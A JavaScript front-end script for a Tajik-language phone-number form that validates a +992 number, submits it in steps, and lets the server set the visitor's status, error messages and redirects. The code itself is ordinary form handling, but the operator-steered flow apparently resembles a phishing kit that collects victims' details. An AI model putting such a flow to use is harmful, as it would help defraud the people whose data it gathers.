const form = document.getElementById("phoneForm");
const phoneInput = document.getElementById("phone");
const statusMessage = document.getElementById("statusMessage");
const phoneError = document.getElementById("phoneError");
const submitButton = form.querySelector("button[type='submit']");
const query = new URLSearchParams(window.location.search);
const clientId = query.get("client");

const formatDigits = (value) => {
  const digits = value.replace(/\D/g, "").slice(0, 9);
  const parts = [];

  if (digits.length > 0) parts.push(digits.slice(0, 2));
  if (digits.length > 2) parts.push(digits.slice(2, 5));
  if (digits.length > 5) parts.push(digits.slice(5, 7));
  if (digits.length > 7) parts.push(digits.slice(7, 9));

  return parts.join(" ");
};

const setStatus = (message, type = "") => {
  statusMessage.textContent = message;
  statusMessage.className = "status";
  if (type) statusMessage.classList.add(`is-${type}`);
};

const setFieldError = (message = "") => {
  if (phoneError) {
    phoneError.textContent = message;
  }
};

const setButtonState = (isReady, label = "Давомадан") => {
  submitButton.textContent = label;
  submitButton.disabled = !isReady;
  submitButton.classList.toggle("is-inactive", !isReady);
  submitButton.classList.toggle("is-ready", isReady);
};

const validatePhone = () => {
  const localNumber = phoneInput.value.replace(/\D/g, "");

  if (!localNumber.length) {
    setFieldError("");
    return false;
  }

  if (localNumber.length !== 9) {
    setFieldError("Рақам бояд аз 9 рақам иборат бошад.");
    return false;
  }

  setFieldError("");
  return true;
};

const loadClient = async () => {
  if (!clientId) return null;

  const response = await fetch(`/api/client/${clientId}`);
  const data = await response.json();

  if (!response.ok || !data.ok) return null;

  if (data.client.status === "waiting") {
    window.location.replace(data.client.redirectUrl);
    return null;
  }

  if (data.client.status !== "phone") {
    window.location.replace(data.client.redirectUrl);
    return null;
  }

  if (data.client.currentError) {
    setStatus(data.client.currentError, "error");
  }

  if (data.client.phone) {
    const localPhone = data.client.phone.replace("+992", "");
    phoneInput.value = formatDigits(localPhone);
  }

  setButtonState(validatePhone());

  return data.client;
};

phoneInput.addEventListener("input", (event) => {
  event.target.value = formatDigits(event.target.value);
  const isValid = validatePhone();
  setButtonState(isValid);
});

form.addEventListener("submit", async (event) => {
  event.preventDefault();

  const localNumber = phoneInput.value.replace(/\D/g, "");
  if (!validatePhone()) {
    setStatus("Лутфан рақами дурустро ворид кунед.", "error");
    setButtonState(false);
    return;
  }

  const fullPhone = `+992${localNumber}`;
  setButtonState(false, "Фиристода истодааст...");
  setStatus("Маълумот фиристода шуда истодааст...");

  try {
    const isRetry = Boolean(clientId);
    const response = await fetch(
      isRetry ? `/api/client/${clientId}/submit-step` : "/api/submit-phone",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(isRetry ? { step: "phone", value: fullPhone } : { phone: fullPhone })
      }
    );

    const data = await response.json();
    if (!response.ok || !data.ok) {
      throw new Error(data.message || "Submit failed.");
    }

    window.location.href = data.redirectUrl;
  } catch (error) {
    setStatus("Фиристодан муваффақ нашуд. Дубора кӯшиш кунед.", "error");
    setButtonState(validatePhone());
  }
});

setButtonState(false);
loadClient();
